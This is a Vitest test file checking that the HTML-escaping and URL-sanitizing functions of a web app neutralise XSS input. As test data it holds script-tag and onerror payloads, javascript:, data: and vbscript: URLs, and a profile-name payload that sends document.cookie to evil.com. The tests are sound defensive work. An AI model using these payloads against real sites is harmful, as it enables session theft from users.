import { describe, expect, it } from 'vitest'

import { escapeHtml, sanitizeUrl } from '../sanitize'

describe('escapeHtml', () => {
  it('escapes ampersand', () => {
    expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry')
  })

  it('escapes less-than sign', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;')
  })

  it('escapes greater-than sign', () => {
    expect(escapeHtml('a > b')).toBe('a &gt; b')
  })

  it('escapes double quotes', () => {
    expect(escapeHtml('say "hello"')).toBe('say &quot;hello&quot;')
  })

  it('escapes single quotes', () => {
    expect(escapeHtml("it's")).toBe('it&#039;s')
  })

  it('blocks XSS img onerror payload', () => {
    const payload = '<img src=x onerror=alert(document.cookie)>'
    const escaped = escapeHtml(payload)
    // Tag brackets are escaped so it cannot be parsed as HTML
    expect(escaped).not.toContain('<img')
    expect(escaped).not.toContain('>')
    expect(escaped).toContain('&lt;img')
    expect(escaped).toContain('&gt;')
  })

  it('blocks XSS script tag', () => {
    const payload = '<script>alert("xss")</script>'
    const escaped = escapeHtml(payload)
    expect(escaped).not.toContain('<script>')
    expect(escaped).toContain('&lt;script&gt;')
  })

  it('returns empty string unchanged', () => {
    expect(escapeHtml('')).toBe('')
  })

  it('returns plain text unchanged', () => {
    expect(escapeHtml('Hello World')).toBe('Hello World')
  })

  it('handles all special characters together', () => {
    const input = '& < > " \''
    const result = escapeHtml(input)
    expect(result).toBe('&amp; &lt; &gt; &quot; &#039;')
  })

  it('CERTIFICATE XSS: escapes malicious profile name', () => {
    const maliciousName =
      '<img src=x onerror=window.location="http://evil.com?cookie="+document.cookie>'
    const escaped = escapeHtml(maliciousName)
    // When injected into document.write, must not execute as HTML:
    // tag brackets are escaped, quotes are escaped — browser cannot parse it as a tag
    expect(escaped).not.toMatch(/<img/)
    expect(escaped).toContain('&lt;img')
    expect(escaped).toContain('&quot;')
    expect(escaped).toContain('&gt;')
  })
})

describe('sanitizeUrl', () => {
  it('allows valid http and https URLs', () => {
    expect(sanitizeUrl('https://example.com')).toBe('https://example.com')
    expect(sanitizeUrl('http://example.com')).toBe('http://example.com')
    expect(sanitizeUrl('https://example.com/path?query=1#hash')).toBe(
      'https://example.com/path?query=1#hash'
    )
  })

  it('allows mailto and tel URLs', () => {
    expect(sanitizeUrl('mailto:test@example.com')).toBe('mailto:test@example.com')
    expect(sanitizeUrl('tel:+1234567890')).toBe('tel:+1234567890')
  })

  it('allows relative URLs', () => {
    expect(sanitizeUrl('/path/to/file.pdf')).toBe('/path/to/file.pdf')
    expect(sanitizeUrl('path/to/file.pdf')).toBe('path/to/file.pdf')
    expect(sanitizeUrl('./file.pdf')).toBe('./file.pdf')
    expect(sanitizeUrl('../file.pdf')).toBe('../file.pdf')
  })

  it('blocks javascript: URLs', () => {
    expect(sanitizeUrl('javascript:alert(1)')).toBe('#')
    expect(sanitizeUrl('javascript:alert("XSS")')).toBe('#')
    expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBe('#')
    expect(sanitizeUrl('javascript:void(0)')).toBe('#')
  })

  it('blocks data: and vbscript: URLs', () => {
    expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('#')
    expect(sanitizeUrl('vbscript:msgbox("XSS")')).toBe('#')
  })

  it('handles null and undefined', () => {
    expect(sanitizeUrl(null)).toBe('#')
    expect(sanitizeUrl(undefined)).toBe('#')
  })

  it('handles empty strings', () => {
    expect(sanitizeUrl('')).toBe('#')
  })
})
